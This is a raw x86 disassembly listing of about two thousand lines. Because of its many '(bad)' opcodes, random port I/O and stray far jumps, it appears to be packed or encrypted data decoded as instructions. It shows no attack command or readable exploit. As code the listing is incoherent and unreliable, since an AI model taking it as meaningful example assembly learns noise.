  4168d4:	shl    DWORD PTR [esp+edx*2-0x5767a44a],1
  4168db:	test   BYTE PTR [edi-0xcdaf44],al
  4168e1:	cmp    eax,0xa97815d8
  4168e6:	loopne 0x4168fd
  4168e8:	pop    es
  4168e9:	stos   BYTE PTR es:[edi],al
  4168ea:	std    
  4168eb:	sar    edx,cl
  4168ed:	call   0x661cc9c3
  4168f2:	push   edx
  4168f3:	into   
  4168f4:	stc    
  4168f5:	dec    edi
  4168f6:	push   esi
  4168f7:	dec    ebp
  4168f8:	shr    BYTE PTR [ebx],cl
  4168fa:	push   edx
  4168fb:	dec    edi
  4168fc:	dec    ecx
  4168fd:	cld    
  4168fe:	mov    eax,0x99eaedef
  416903:	pop    esi
  416904:	adc    al,0xd7
  416906:	adc    DWORD PTR [ecx+edi*2+0x21],eax
  41690a:	sbb    DWORD PTR [ebx],0xffffffbb
  41690d:	ss push esi
  41690f:	mov    WORD PTR [eax+0x46e12661],fs
  416915:	imul   edx,DWORD PTR [esi+esi*1-0x4331b373],0x3f
  41691d:	out    dx,eax
  41691e:	cmp    al,0x55
  416920:	dec    edi
  416921:	add    al,dl
  416923:	imul   DWORD PTR [edx+0x71bd719e]
  416929:	xor    al,0x4c
  41692b:	(bad)  
  41692d:	lahf   
  41692e:	mov    dl,0xf7
  416930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416931:	pop    ds
  416932:	(bad)  
  416933:	lock lock mov ch,0x84
  416937:	shl    DWORD PTR [ecx+eiz*2+0x29],1
  41693b:	mov    eax,0x920d7648
  416940:	int    0x5a
  416942:	loopne 0x41691e
  416944:	mov    ch,BYTE PTR [edx+esi*4-0x6670f3df]
  41694b:	outs   dx,BYTE PTR ds:[esi]
  41694c:	leave  
  41694d:	jecxz  0x4169a5
  41694f:	jle    0x416979
  416951:	pusha  
  416952:	and    al,0x85
  416954:	out    dx,al
  416955:	xor    eax,0x122b5675
  41695a:	leave  
  41695b:	dec    edx
  41695c:	inc    esi
  41695d:	pop    edx
  41695e:	(bad)
  416962:	push   ecx
  416963:	imul   edi,DWORD PTR [ecx],0x71cd8a0d
  416969:	loope  0x4169df
  41696b:	xchg   esp,eax
  41696c:	mov    bh,0xe6
  41696e:	in     eax,0xe0
  416970:	pop    esi
  416971:	jne    0x41692a
  416973:	add    BYTE PTR [edx+0x1b72e776],dh
  416979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41697a:	frstor [ebx]
  41697c:	jbe    0x416989
  41697e:	xor    eax,0x902102d8
  416983:	int    0x11
  416985:	push   esp
  416986:	aad    0xe4
  416988:	push   esp
  416989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41698a:	std    
  41698b:	popf   
  41698c:	mov    eax,0x3c72f259
  416991:	repz sub DWORD PTR ds:0x5585b79,edx
  416998:	int3   
  416999:	push   esp
  41699a:	scas   eax,DWORD PTR es:[edi]
  41699b:	aaa    
  41699c:	out    dx,eax
  41699d:	sub    esp,DWORD PTR [ecx-0x75]
  4169a0:	cmp    al,0x7a
  4169a2:	mov    bl,0xaa
  4169a4:	sub    BYTE PTR ss:[ecx+eiz*4-0x1c3b1153],bl
  4169ac:	hlt    
  4169ad:	pop    edx
  4169ae:	repz (bad) 
  4169b0:	mov    WORD PTR [ebp+0x10],ds
  4169b3:	pop    ebp
  4169b4:	icebp  
  4169b5:	rcl    bl,cl
  4169b7:	fwait
  4169b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b9:	neg    BYTE PTR [eax+0x79]
  4169bc:	test   DWORD PTR [edi+0x12771a04],0x475dc6bd
  4169c6:	push   ebx
  4169c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169c8:	js     0x4169bc
  4169ca:	stos   BYTE PTR es:[edi],al
  4169cb:	adc    al,0x29
  4169cd:	sti    
  4169ce:	mov    BYTE PTR [edi],ah
  4169d0:	addr16 test eax,0xfc6035f7
  4169d6:	mov    ch,0xe6
  4169d8:	dec    edx
  4169d9:	mov    dl,0xba
  4169db:	out    0x40,al
  4169dd:	xchg   DWORD PTR [edx+ecx*1],edi
  4169e0:	jns    0x416a1f
  4169e2:	jle    0x416a45
  4169e4:	mov    ds:0x5b19a459,eax
  4169e9:	jp     0x416a41
  4169eb:	jle    0x416a6c
  4169ed:	pusha  
  4169ee:	mov    ecx,0x6df787e3
  4169f3:	inc    esp
  4169f4:	fisttp WORD PTR [esi+edi*1+0x7773c360]
  4169fb:	in     al,0xe1
  4169fd:	out    dx,al
  4169fe:	stos   DWORD PTR es:[edi],eax
  4169ff:	mov    cl,al
  416a01:	mov    al,ds:0x8a1926fd
  416a06:	rep outs dx,DWORD PTR ds:[esi]
  416a08:	or     eax,0x6e617c99
  416a0d:	sbb    BYTE PTR [edx+0x2f],0xdd
  416a11:	lods   eax,DWORD PTR ds:[esi]
  416a12:	pop    ss
  416a13:	push   ebx
  416a14:	stos   BYTE PTR es:[edi],al
  416a15:	(bad)  
  416a16:	pop    ecx
  416a17:	test   eax,0x86c4a6cc
  416a1c:	pop    eax
  416a1d:	in     eax,dx
  416a1e:	and    BYTE PTR [ebx-0x6f],ch
  416a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a22:	mov    al,ds:0x37b3b310
  416a27:	sbb    al,0xd7
  416a29:	out    0xf1,al
  416a2b:	out    0x79,eax
  416a2d:	pop    ebx
  416a2e:	jg     0x4169b7
  416a30:	jg     0x4169bf
  416a32:	cmp    BYTE PTR [esi],ah
  416a34:	xchg   ecx,eax
  416a35:	mov    esi,0xd77754f0
  416a3a:	test   al,0xe0
  416a3c:	repnz xor ecx,DWORD PTR [edx]
  416a3f:	xchg   ebp,edi
  416a41:	push   cs
  416a42:	add    edi,DWORD PTR [esi+0x4c]
  416a45:	cmp    al,0x89
  416a47:	into   
  416a48:	xchg   edx,eax
  416a49:	call   0x2154:0x8140c72d
  416a50:	loop   0x416ab9
  416a52:	add    BYTE PTR [ecx+ebx*8],dh
  416a55:	sti    
  416a56:	xor    dh,bl
  416a58:	pop    esi
  416a59:	out    dx,eax
  416a5a:	lahf   
  416a5b:	test   BYTE PTR [eax+0x28],0xe7
  416a5f:	mov    edx,ss
  416a61:	das    
  416a62:	cmc    
  416a63:	mov    cl,0xa4
  416a65:	xor    ebp,ebx
  416a67:	loope  0x416a61
  416a69:	and    bl,dl
  416a6b:	adc    BYTE PTR [edi],0x67
  416a6e:	in     eax,0x98
  416a70:	nop
  416a71:	cmp    BYTE PTR [ecx-0x680c11c6],cl
  416a77:	cmp    eax,0x60547b6f
  416a7c:	ja     0x416ae8
  416a7e:	lds    edx,FWORD PTR [esi-0x3cf4a938]
  416a84:	test   eax,0x2fc6c507
  416a89:	push   ecx
  416a8a:	and    esp,DWORD PTR [edx-0x75]
  416a8d:	jb     0x416a4b
  416a8f:	fldcw  WORD PTR [edi-0x2e]
  416a92:	rcr    BYTE PTR [ebx],0x93
  416a95:	fcmove st,st(6)
  416a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a98:	dec    esi
  416a99:	mul    BYTE PTR [esi]
  416a9b:	pop    ss
  416a9c:	mov    cs,WORD PTR [ecx]
  416a9e:	xor    cl,BYTE PTR [eax+0x4d]
  416aa1:	out    0x4c,eax
  416aa3:	mov    al,0xa
  416aa5:	push   es
  416aa6:	mov    esp,0xe6d344c2
  416aab:	push   edx
  416aac:	les    eax,FWORD PTR [ebx+0x5ce16d3b]
  416ab2:	adc    BYTE PTR [esi],0xf7
  416ab5:	adc    DWORD PTR [edx+0x67804479],edi
  416abb:	out    dx,eax
  416abc:	jo     0x416a84
  416abe:	aad    0x4
  416ac0:	push   edi
  416ac1:	leave  
  416ac2:	aam    0x6b
  416ac4:	cmp    eax,0x3fc69dd
  416ac9:	mov    ah,0x3
  416acb:	xchg   edx,eax
  416acc:	xchg   ebx,eax
  416acd:	jmp    FWORD PTR [ecx-0x5f]
  416ad0:	sbb    al,0x26
  416ad2:	cvtps2pd xmm1,QWORD PTR [ebx]
  416ad5:	outs   dx,BYTE PTR ds:[esi]
  416ad6:	ffreep st(6)
  416ad8:	mov    eax,0xb3fdfb8c
  416add:	cmp    edi,DWORD PTR [eax*8-0x5b478fc8]
  416ae4:	adc    DWORD PTR [ebp+0xc2215e0],eax
  416aea:	or     eax,eax
  416aec:	popa   
  416aed:	loop   0x416aa5
  416aef:	inc    edi
  416af0:	test   DWORD PTR [eax],ebp
  416af2:	test   DWORD PTR [esi],edi
  416af4:	xchg   ecx,eax
  416af5:	pop    es
  416af6:	loope  0x416b3a
  416af8:	push   edi
  416af9:	sbb    bl,dl
  416afb:	shl    ah,cl
  416afd:	xor    esi,DWORD PTR [edi]
  416aff:	gs (bad) 
  416b01:	in     al,0xe0
  416b03:	xchg   esi,edx
  416b05:	dec    esp
  416b06:	(bad)  
  416b07:	std    
  416b08:	hlt    
  416b09:	sbb    BYTE PTR [edx-0x32],al
  416b0c:	stc    
  416b0d:	(bad)  
  416b0e:	(bad)  
  416b10:	push   esp
  416b11:	loopne 0x416ab5
  416b13:	cmp    eax,0xb9981b1
  416b18:	mov    dl,0xa5
  416b1a:	or     al,0x16
  416b1c:	lods   eax,DWORD PTR ds:[esi]
  416b1d:	and    eax,edx
  416b1f:	fcomp  QWORD PTR [esi+0x4f6fe843]
  416b25:	or     ebp,DWORD PTR [edx]
  416b27:	and    ah,bh
  416b29:	adc    BYTE PTR [ecx-0x58],al
  416b2c:	ds mov al,0x41
  416b2f:	ins    BYTE PTR es:[edi],dx
  416b30:	mov    BYTE PTR [edx],cl
  416b32:	lods   eax,DWORD PTR ds:[esi]
  416b33:	mov    bl,0xc4
  416b35:	jle    0x416b80
  416b37:	add    esp,ebp
  416b39:	adc    dh,BYTE PTR [edi-0x18]
  416b3c:	pop    edx
  416b3d:	repnz retf 
  416b3f:	xchg   esi,edx
  416b41:	leave  
  416b42:	add    edi,ecx
  416b44:	xor    eax,0x4e0e71cc
  416b49:	jmp    0x79e6:0x6d72f20c
  416b50:	mov    eax,ds:0xab5c011f
  416b55:	cmp    edi,eax
  416b57:	sti    
  416b58:	stos   BYTE PTR es:[edi],al
  416b59:	outs   dx,DWORD PTR ds:[esi]
  416b5a:	xchg   BYTE PTR [esi+edi*2+0x622833df],dl
  416b61:	cmp    eax,0xc264ef82
  416b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b67:	pop    esi
  416b68:	adc    esi,DWORD PTR [esi+0x6d00a99]
  416b6e:	xor    DWORD PTR ds:[eax],0xffffffc4
  416b72:	lods   al,BYTE PTR ds:[esi]
  416b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b74:	in     eax,dx
  416b75:	pop    esp
  416b76:	and    cl,BYTE PTR [eax+0x4b3c7763]
  416b7c:	ror    cl,1
  416b7e:	hlt    
  416b7f:	mov    cl,0xbe
  416b81:	cbw    
  416b83:	push   eax
  416b84:	loope  0x416b6e
  416b86:	data16 aad 0xa
  416b89:	pusha  
  416b8a:	stos   BYTE PTR es:[edi],al
  416b8b:	or     DWORD PTR [ecx-0x7c36a35e],esi
  416b91:	dec    ecx
  416b92:	cmp    edi,DWORD PTR [ebp-0x6c]
  416b95:	cmc    
  416b96:	sti    
  416b97:	dec    ecx
  416b98:	ins    BYTE PTR es:[edi],dx
  416b99:	sbb    DWORD PTR ds:0x184b94d0,edi
  416b9f:	cwde   
  416ba0:	push   ss
  416ba1:	xor    eax,0x993e6851
  416ba6:	inc    esp
  416ba7:	pusha  
  416ba8:	sub    esi,esi
  416baa:	xor    BYTE PTR [ebp+0x63b2ff9c],dl
  416bb0:	fidiv  WORD PTR [ebx+0x1e1714]
  416bb6:	repz dec esp
  416bb8:	or     DWORD PTR [eax],ebp
  416bba:	(bad)  
  416bbb:	or     al,0x4d
  416bbd:	cwde   
  416bbe:	mov    al,ds:0xd56b418f
  416bc3:	xor    eax,0x2a45e7e9
  416bc8:	xor    dh,BYTE PTR [edx]
  416bca:	and    bl,BYTE PTR [ebx+0x36]
  416bcd:	xchg   ebx,eax
  416bce:	push   edi
  416bcf:	jge    0x416bef
  416bd1:	(bad)  
  416bd2:	int    0xf4
  416bd4:	shl    cl,cl
  416bd6:	ja     0x416b58
  416bd8:	mov    DWORD PTR [edx-0x5296dbc6],ebx
  416bde:	dec    eax
  416bdf:	or     DWORD PTR [edx-0x26b30050],esp
  416be5:	jns    0x416bee
  416be7:	and    al,0x3c
  416be9:	adc    edi,DWORD PTR [edi]
  416beb:	pop    ebp
  416bec:	jecxz  0x416c0c
  416bee:	adc    DWORD PTR [ebx],ebx
  416bf0:	pmullw mm0,QWORD PTR [ebp-0x6c]
  416bf4:	out    dx,al
  416bf5:	sub    edx,DWORD PTR [ecx+0x35]
  416bf8:	ds je  0x416b9c
  416bfb:	and    al,0x42
  416bfd:	mov    esi,0xd284bb6c
  416c02:	mov    eax,0xce7a2a97
  416c07:	jl     0x416c83
  416c09:	push   ebx
  416c0a:	dec    ebx
  416c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c0c:	xchg   ecx,eax
  416c0d:	and    dl,BYTE PTR [ecx+0xa55b59e]
  416c13:	out    0x19,eax
  416c15:	lahf   
  416c16:	xchg   BYTE PTR [edx+0x65],al
  416c19:	nop
  416c1a:	jmp    0xaa58a004
  416c1f:	sahf   
  416c20:	sbb    dh,ch
  416c22:	daa    
  416c23:	in     al,0xf5
  416c25:	jmp    0x416bce
  416c27:	(bad)  
  416c28:	aad    0x16
  416c2a:	mov    ebp,0x8fba6193
  416c2f:	sub    esi,eax
  416c31:	and    BYTE PTR [eax+0x26],cl
  416c34:	adc    DWORD PTR [ebp-0x27c870d2],esi
  416c3a:	aad    0x32
  416c3c:	push   0x18017c52
  416c41:	mov    cl,0xe9
  416c43:	jmp    0xc51a:0x62b6b5bc
  416c4a:	(bad)  
  416c4b:	sahf   
  416c4c:	ja     0x416c01
  416c4e:	ret    0xdf6d
  416c51:	ror    DWORD PTR [ebx+eiz*1],cl
  416c54:	(bad)  
  416c55:	adc    edi,DWORD PTR ds:0x9062eb22
  416c5b:	dec    esi
  416c5c:	outs   dx,DWORD PTR ds:[esi]
  416c5d:	je     0x416c8a
  416c5f:	cwde   
  416c60:	lahf   
  416c61:	scas   eax,DWORD PTR es:[edi]
  416c62:	push   ecx
  416c63:	inc    esi
  416c64:	call   0x58764ef0
  416c69:	fstp   TBYTE PTR [eax+0x1c9bb40b]
  416c6f:	rcl    dl,1
  416c71:	push   0x77
  416c73:	fisttp DWORD PTR [ebp-0xd]
  416c76:	jecxz  0x416c55
  416c78:	xor    eax,ebx
  416c7a:	xchg   DWORD PTR [eax],ecx
  416c7c:	(bad)  
  416c7d:	out    0xf3,eax
  416c7f:	rep outs dx,DWORD PTR ds:[esi]
  416c81:	mov    ds:0x910942bd,al
  416c86:	rcl    dh,1
  416c88:	int    0x33
  416c8a:	lea    esi,[edx]
  416c8c:	xchg   esi,eax
  416c8d:	push   esp
  416c8e:	mov    bl,0x3f
  416c90:	call   0x1a11a824
  416c95:	fild   QWORD PTR [eax+0x4ca7e9a7]
  416c9b:	inc    eax
  416c9c:	mov    al,0x15
  416c9e:	pop    es
  416c9f:	sub    eax,0xe8bc0fb9
  416ca4:	retf   0x5682
  416ca7:	or     eax,0x1c957382
  416cac:	ret    0x69d1
  416caf:	pop    eax
  416cb0:	mov    bh,0x80
  416cb2:	mov    bh,0xe2
  416cb4:	jnp    0x416c7b
  416cb6:	fs in  al,0xca
  416cb9:	jp     0x416d08
  416cbb:	adc    BYTE PTR [esi],cl
  416cbd:	and    eax,0xd11c4d24
  416cc2:	cdq    
  416cc3:	shl    BYTE PTR [ecx-0x67],1
  416cc6:	outs   dx,DWORD PTR ds:[esi]
  416cc7:	push   esi
  416cc8:	dec    edx
  416cc9:	call   0x74e0:0xa2017de2
  416cd0:	xchg   ebx,eax
  416cd1:	retf   0x799d
  416cd4:	or     DWORD PTR [edi],ebp
  416cd6:	ins    DWORD PTR es:[edi],dx
  416cd7:	xchg   edi,eax
  416cd8:	xor    eax,0x5b7a51fa
  416cdd:	cmp    BYTE PTR [edx-0x3a6181c4],bl
  416ce3:	ret    
  416ce4:	je     0x416cf5
  416ce6:	cli    
  416ce7:	mov    dh,0xe4
  416ce9:	pop    eax
  416cea:	cmp    al,0xd4
  416cec:	xchg   bh,bl
  416cee:	sub    DWORD PTR [ebx-0x2091db12],ebx
  416cf4:	inc    ecx
  416cf5:	imul   ecx,DWORD PTR [edi-0x37f1ea1e],0xfffffff3
  416cfc:	dec    edi
  416cfd:	sbb    ch,dh
  416cff:	pop    esi
  416d00:	cwde   
  416d01:	cwde   
  416d02:	mov    bl,0x73
  416d04:	call   0x9185:0xea75fdde
  416d0b:	aad    0x4b
  416d0d:	push   ss
  416d0e:	retf   
  416d0f:	xchg   ecx,eax
  416d10:	xchg   edx,eax
  416d11:	lds    edx,FWORD PTR [eax]
  416d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d14:	outs   dx,DWORD PTR ds:[esi]
  416d15:	fisub  DWORD PTR [edx+0x49]
  416d18:	adc    eax,0x44cbf3b3
  416d1d:	push   ebp
  416d1e:	mov    esp,DWORD PTR [edx+0x57]
  416d21:	or     ch,BYTE PTR [edi+0x61]
  416d24:	inc    edx
  416d25:	pop    ebp
  416d26:	fcom   QWORD PTR [ebx+0x7905fbb7]
  416d2c:	push   esi
  416d2d:	adc    esi,DWORD PTR [esi-0x576ec2f5]
  416d33:	(bad)  
  416d35:	test   al,0x32
  416d37:	fs daa 
  416d39:	pop    esp
  416d3a:	pop    edx
  416d3b:	xor    BYTE PTR [ebx],dl
  416d3d:	aaa    
  416d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d40:	call   0xdbce335
  416d45:	mov    es,WORD PTR [ebp+esi*1+0x5a5fef5d]
  416d4c:	jle    0x416d51
  416d4e:	mov    dl,al
  416d50:	add    ebp,ebp
  416d52:	lahf   
  416d53:	retf   
  416d54:	repnz add al,0x21
  416d57:	clc    
  416d58:	out    dx,al
  416d59:	add    eax,0xe829ecb7
  416d5e:	xor    DWORD PTR [esi-0x22a37a71],esp
  416d64:	mov    eax,0x479f5950
  416d69:	add    BYTE PTR [eax-0x2a],bl
  416d6c:	fbld   TBYTE PTR [edx+0x5202ee]
  416d72:	push   esp
  416d73:	mov    BYTE PTR [esi],ah
  416d75:	cmp    DWORD PTR [ebx],0xffffffc2
  416d78:	xchg   edx,eax
  416d79:	pushf  
  416d7a:	repnz pop es
  416d7c:	ret    
  416d7d:	and    al,0x35
  416d7f:	hlt    
  416d80:	ror    ebp,0xd7
  416d83:	dec    ecx
  416d84:	icebp  
  416d85:	cmp    ecx,edx
  416d87:	loop   0x416ddd
  416d89:	and    DWORD PTR [eax+0x1b],0xffffffd8
  416d8d:	cmp    esi,edi
  416d8f:	sti    
  416d90:	(bad)  
  416d92:	sbb    DWORD PTR [ebx+0x17],ecx
  416d95:	push   ebp
  416d96:	add    DWORD PTR [edx+0x38],ecx
  416d99:	cmp    ebp,DWORD PTR [ecx+0x53]
  416d9c:	and    ebx,DWORD PTR [ebx+0x8]
  416d9f:	mov    cl,0x44
  416da1:	or     DWORD PTR [ecx+0x18a8dd50],eax
  416da7:	push   edx
  416da8:	add    dl,bl
  416daa:	and    BYTE PTR [ebx-0x3b],bl
  416dad:	xor    DWORD PTR [ebx],esp
  416daf:	or     dh,cl
  416db1:	dec    edx
  416db2:	sti    
  416db3:	in     al,dx
  416db4:	sub    DWORD PTR [esi+edi*2+0x513e5685],ebx
  416dbb:	jmp    FWORD PTR [ecx-0x445b0d3e]
  416dc1:	jmp    0x416ddb
  416dc3:	fadd   DWORD PTR [eax]
  416dc5:	or     BYTE PTR [edi],ch
  416dc7:	mov    esp,0xef9a173
  416dcc:	ret    0x92fe
  416dcf:	xchg   esp,eax
  416dd0:	iret   
  416dd1:	mov    eax,0x676d5f41
  416dd6:	jmp    0x2152:0x600744ed
  416ddd:	in     eax,0x35
  416ddf:	repz mov al,ds:0x7b76b22
  416de5:	nop
  416de6:	adc    ah,ah
  416de8:	ret    
  416de9:	and    DWORD PTR [eax-0x2e5bb4ff],edx
  416def:	pop    ecx
  416df0:	nop
  416df1:	scas   eax,DWORD PTR es:[edi]
  416df2:	mov    dh,0x86
  416df4:	jmp    0x416e54
  416df6:	loop   0x416d83
  416df8:	mov    ch,0xb
  416dfa:	je     0x416dad
  416dfc:	gs push esi
  416dfe:	inc    ecx
  416dff:	je     0x416dae
  416e01:	out    dx,eax
  416e02:	push   es
  416e03:	in     eax,0x3b
  416e05:	jge    0x416e71
  416e07:	or     edx,DWORD PTR [ebx-0x69585f8b]
  416e0d:	pushf  
  416e0e:	jl     0x416ddf
  416e10:	test   DWORD PTR [ebx+0xfe1122e],edi
  416e16:	lea    eax,[eax]
  416e18:	pusha  
  416e19:	loop   0x416e03
  416e1b:	push   ebx
  416e1c:	mov    DWORD PTR [edx-0x90f5480],eax
  416e22:	sbb    al,0x5c
  416e24:	jmp    0x9590:0xbea58a11
  416e2b:	push   eax
  416e2c:	adc    ebx,ebp
  416e2e:	dec    eax
  416e2f:	jl     0x416e43
  416e31:	or     BYTE PTR [esi],bh
  416e33:	in     eax,dx
  416e34:	add    DWORD PTR [edx+0x4],ecx
  416e37:	shl    BYTE PTR [edx],0x71
  416e3a:	mov    cl,0xc1
  416e3c:	push   esi
  416e3d:	and    ebp,ecx
  416e3f:	and    eax,0xb3d6f9ba
  416e44:	aaa    
  416e45:	sub    al,0xc3
  416e47:	dec    esp
  416e48:	xor    BYTE PTR [ebp+0x13cdc2e1],dl
  416e4e:	les    ebx,FWORD PTR [eax]
  416e50:	je     0x416e26
  416e52:	jo     0x416e52
  416e54:	add    BYTE PTR [ecx+0x2d032d83],bh
  416e5a:	xchg   edx,eax
  416e5b:	call   0xdacbff49
  416e60:	out    dx,eax
  416e61:	int    0x2c
  416e63:	push   ebx
  416e64:	sbb    eax,0x7154d8d9
  416e69:	ss push edx
  416e6b:	bound  esi,QWORD PTR [eax-0x4aa7850f]
  416e71:	es adc al,0x21
  416e74:	sub    BYTE PTR [edx+0x101e1d48],0xaf
  416e7b:	mov    edx,0x60f28cfe
  416e80:	dec    ecx
  416e81:	sbb    al,0x16
  416e83:	outs   dx,BYTE PTR ds:[esi]
  416e84:	pop    ss
  416e85:	add    bh,cl
  416e87:	imul   eax,ecx,0x5b126ab
  416e8d:	call   0xdb89:0x9803b5a7
  416e94:	imul   esi,DWORD PTR [ecx],0x14
  416e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e98:	pop    es
  416e99:	mov    esi,0x2fc1f6da
  416e9e:	sahf   
  416e9f:	sbb    bl,dh
  416ea1:	(bad)  
  416ea2:	mov    edi,0x686ba81f
  416ea7:	xchg   ebx,eax
  416ea8:	pop    ecx
  416ea9:	push   cs
  416eaa:	gs jno 0x416e34
  416ead:	inc    edx
  416eae:	std    
  416eaf:	call   FWORD PTR ds:0xb8351fdc
  416eb5:	or     ebx,0xffffffa9
  416eb8:	and    BYTE PTR [eax+0x7b6b0ce8],dl
  416ebe:	in     eax,0x8a
  416ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec1:	cmp    ch,BYTE PTR gs:[esi-0x55]
  416ec5:	sbb    al,BYTE PTR [ecx+0x41]
  416ec8:	sub    eax,0x4867e92b
  416ecd:	cwde   
  416ece:	out    dx,eax
  416ecf:	rol    dh,0xce
  416ed2:	cmp    esp,esp
  416ed4:	outs   dx,DWORD PTR ds:[esi]
  416ed5:	adc    eax,0xe090ae19
  416eda:	mov    BYTE PTR [esi-0x65],cl
  416edd:	pop    es
  416ede:	(bad)  
  416edf:	push   ss
  416ee0:	test   cl,0xd7
  416ee3:	loopne 0x416f14
  416ee5:	pop    edi
  416ee6:	out    dx,eax
  416ee7:	(bad)  
  416ee8:	mov    dh,0x90
  416eea:	xchg   esi,eax
  416eeb:	jns    0x416eab
  416eed:	dec    esi
  416eee:	ins    BYTE PTR es:[edi],dx
  416eef:	out    dx,eax
  416ef0:	and    edx,edx
  416ef2:	push   eax
  416ef3:	addr16 cmp al,0xe6
  416ef6:	subps  xmm6,XMMWORD PTR [eax+0x4bd9c7ed]
  416efd:	jno    0x416ef0
  416eff:	cmp    cl,BYTE PTR [esi-0x8]
  416f02:	and    eax,0xe4d2efb
  416f07:	xor    bl,0x2b
  416f0a:	loopne 0x416f06
  416f0c:	fcomi  st,st(0)
  416f0e:	shl    BYTE PTR [ebx+ebx*4],1
  416f11:	out    0xd6,eax
  416f13:	cmp    ecx,esp
  416f15:	sar    DWORD PTR [esi-0x55],0x8b
  416f19:	mov    cl,ch
  416f1b:	mov    bl,0x41
  416f1d:	jns    0x416ed9
  416f1f:	ret    
  416f20:	lods   al,BYTE PTR ds:[esi]
  416f21:	out    dx,al
  416f22:	add    al,0x72
  416f24:	rcpps  xmm3,xmm5
  416f27:	ins    DWORD PTR es:[edi],dx
  416f28:	mov    dh,0xe0
  416f2a:	push   cs
  416f2b:	mov    ch,0x3c
  416f2d:	inc    ebp
  416f2e:	out    dx,eax
  416f2f:	jp     0x416ed0
  416f31:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  416f33:	or     al,0xee
  416f35:	(bad)
  416f39:	xor    DWORD PTR [edx],edi
  416f3b:	enter  0xbf04,0x4b
  416f3f:	xchg   esi,eax
  416f40:	and    eax,0xdcb3e127
  416f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f46:	aam    0x86
  416f48:	sahf   
  416f49:	jns    0x416f71
  416f4b:	or     al,0xd7
  416f4d:	or     DWORD PTR [ecx],esp
  416f4f:	xor    esi,DWORD PTR [edx-0x49]
  416f52:	ret    0x1334
  416f55:	xchg   ebp,eax
  416f56:	dec    edi
  416f57:	xchg   edx,eax
  416f58:	cs aam 0x6
  416f5b:	(bad)  
  416f5c:	cmp    BYTE PTR [edx+esi*4+0x1dda0f13],dl
  416f63:	pop    esp
  416f64:	aad    0xd5
  416f66:	popa   
  416f67:	mov    BYTE PTR [edx+0x525f4fcf],dh
  416f6d:	sahf   
  416f6e:	nop
  416f6f:	dec    edx
  416f70:	test   BYTE PTR [ebp+edx*4+0x2],dh
  416f74:	das    
  416f75:	les    ecx,FWORD PTR [eax]
  416f77:	pop    edx
  416f78:	mov    eax,0x4f96ca99
  416f7d:	lahf   
  416f7e:	inc    esi
  416f7f:	sbb    esi,DWORD PTR gs:[ecx-0x61]
  416f83:	jnp    0x416fa3
  416f85:	mov    ds:0x7791c84d,al
  416f8a:	test   BYTE PTR [eax-0x2b],0x72
  416f8e:	sbb    cl,BYTE PTR [ecx+edi*2]
  416f91:	sub    DWORD PTR [edi+0x86ae6b2],esi
  416f97:	jno    0x416ffb
  416f99:	outs   dx,DWORD PTR ds:[esi]
  416f9a:	jmp    0x24fc:0x9dfad2c3
  416fa1:	in     eax,0x15
  416fa3:	and    BYTE PTR [ecx],0xf1
  416fa6:	mov    ebx,0xccd8dcc6
  416fab:	pop    ss
  416fac:	dec    esi
  416fad:	mov    bh,0x2b
  416faf:	push   ebp
  416fb0:	dec    eax
  416fb1:	lods   al,BYTE PTR ds:[esi]
  416fb2:	cs and al,0x1e
  416fb5:	push   ds
  416fb6:	xchg   esi,eax
  416fb7:	xchg   esp,eax
  416fb8:	arpl   WORD PTR [edi+0x4622664d],bp
  416fbe:	aas    
  416fbf:	sub    al,0xab
  416fc1:	lods   eax,DWORD PTR ds:[esi]
  416fc2:	fwait
  416fc3:	inc    ebp
  416fc4:	addr16 in eax,0xac
  416fc7:	or     al,0x3c
  416fc9:	mov    BYTE PTR [esi-0x45],ch
  416fcc:	jae    0x416fae
  416fce:	arpl   WORD PTR gs:[edi],cx
  416fd1:	inc    ecx
  416fd2:	cmp    esp,DWORD PTR es:[esi+0x3a]
  416fd6:	daa    
  416fd7:	ins    DWORD PTR es:[edi],dx
  416fd8:	xchg   BYTE PTR [eax-0x6229b57f],bl
  416fde:	stos   BYTE PTR es:[edi],al
  416fdf:	add    DWORD PTR [edx+0x74],esi
  416fe2:	loope  0x417034
  416fe4:	mov    WORD PTR [eax-0x2aa9ec33],?
  416fea:	in     eax,0x85
  416fec:	dec    ecx
  416fed:	pop    esp
  416fee:	(bad)  
  416ff0:	dec    edi
  416ff1:	jbe    0x417010
  416ff3:	mov    dh,BYTE PTR [eax-0x1c]
  416ff6:	xlat   BYTE PTR ds:[ebx]
  416ff7:	mov    dh,0xe8
  416ff9:	jge    0x417011
  416ffb:	xchg   ebp,eax
  416ffc:	dec    ecx
  416ffd:	pop    edx
  416ffe:	push   edx
  416fff:	das    
  417000:	mov    ebp,0xfdd2bf83
  417005:	das    
  417006:	pop    ebp
  417007:	iret   
  417008:	stc    
  417009:	sti    
  41700a:	adc    eax,0x971d8dd3
  41700f:	iret   
  417010:	into   
  417011:	push   ss
  417012:	cmc    
  417013:	adc    al,0x68
  417015:	xor    ebp,edi
  417017:	pop    edx
  417018:	je     0x41708e
  41701a:	jecxz  0x416fce
  41701c:	inc    ebp
  41701d:	fcmovnbe st,st(3)
  41701f:	retf   0x99b2
  417022:	dec    eax
  417023:	mov    esp,0xbd07c8ae
  417028:	cmp    cl,bl
  41702a:	loopne 0x417048
  41702c:	fld    DWORD PTR [ebx+0x36]
  41702f:	adc    eax,0xab490d72
  417034:	js     0x417063
  417036:	sub    edx,DWORD PTR [esi+ebp*8+0x139928e1]
  41703d:	xrelease xchg BYTE PTR [edi-0x14],cl
  417041:	and    BYTE PTR [ecx],dh
  417043:	loop   0x417018
  417045:	push   edi
  417046:	dec    esp
